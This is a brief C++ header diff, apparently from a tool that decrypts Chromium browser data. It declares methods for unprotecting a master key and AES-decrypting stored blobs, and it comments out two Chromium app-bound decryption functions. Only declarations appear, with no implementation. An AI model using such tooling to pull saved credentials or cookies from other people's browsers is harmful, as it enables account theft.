@@ -22,8 +22,8 @@ public:
     DATA_BLOB* UnportectMasterKey(std::string MasterString);
     std::string AESDecrypter(std::vector<BYTE> EncryptedBlob);
 
-    bool ChromiumAppBoundDecryptorInit(std::string key);
-    std::string AESDecrypterAppBound(std::vector<BYTE> EncryptedBlob);
+    //bool ChromiumAppBoundDecryptorInit(std::string key);
+    //std::string AESDecrypterAppBound(std::vector<BYTE> EncryptedBlob);
 
 private:
     // Helper functions if needed
